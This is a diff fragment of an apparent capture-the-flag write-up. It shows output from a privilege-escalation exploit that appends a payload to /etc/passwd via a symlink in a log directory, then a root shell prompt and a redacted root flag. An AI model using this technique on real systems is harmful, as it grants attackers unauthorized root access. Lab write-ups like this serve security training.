@@ -530,5 +530,15 @@ Error Message: Failed to acquire file lock on index file: /var/log/below/store/i
 [*] Appending payload into /etc/passwd via symlink...
 [+] Payload appended successfully.
 [*] Attempting to switch to root shell via 'su attacker'...
+root@outbound:/var/log/below#
 ```
 
+We got the root!
+
+### Flag 2
+
+We can grab the flag from /root/root.txt
+
+```bash
+ec9(REDACTED)97
+```
